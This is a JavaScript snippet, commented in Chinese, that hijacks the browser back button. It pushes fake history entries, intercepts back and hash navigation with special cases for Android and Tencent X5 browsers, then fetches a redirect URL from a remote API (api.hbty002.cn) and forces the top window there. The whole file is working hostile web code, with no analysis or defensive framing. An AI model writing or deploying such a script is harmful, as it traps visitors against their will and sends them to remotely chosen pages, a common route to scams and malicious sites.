
(function () {
    history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());

    // 判断是否为 Android 设备
    function isAndroid() {
        return /Android/i.test(navigator.userAgent);
    }

    // 从 API 获取跳转链接
    function getApiUrl() {
        return fetch('https://api.hbty002.cn/task/getDomain?hh=zz109&cs=2&pp=1')
           .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json(); // 解析 JSON 数据
            })
           .then(data => {
                if (data && data.jump) {
                    return data.jump;
                } else {
                    throw new Error('响应数据中未找到 jump 字段');
                }
            })
           .catch(error => {
                console.error('获取 API 链接时出错:', error);
                return null;
            });
    }

    // 执行跳转逻辑
    function getandjump() {
        window.history.pushState("forward", null, "#");
        window.history.forward(1);

        getApiUrl().then(backUrl => {
            if (backUrl) {
                setTimeout(() => {
                    top.location.href = backUrl;
                }, 80);
            }
        });
    }

    if (isAndroid()) {
        console.log("Android-------");
        if (typeof (tbsJs) !== "undefined") {
            try {
                tbsJs.onReady('{useCachedApi : "true"}', function (e) { });
            } catch (error) {
                console.error("tbsJs.onReady 出错:", error);
            }
            window.onhashchange = function () {
                getandjump();
            };
            console.log("tbsJs-------");
        } else {
            var pop = 0;
            window.onhashchange = function (event) {
                pop++;
                console.log("pop-------", pop);
                if (pop >= 3) {
                    getandjump();
                } else {
                    history.go(1);
                }
            };
            history.go(-1);
        }
    } else {
        console.log("非Android-------");
        window.onhashchange = function () {
            getandjump();
        };
    }
})();
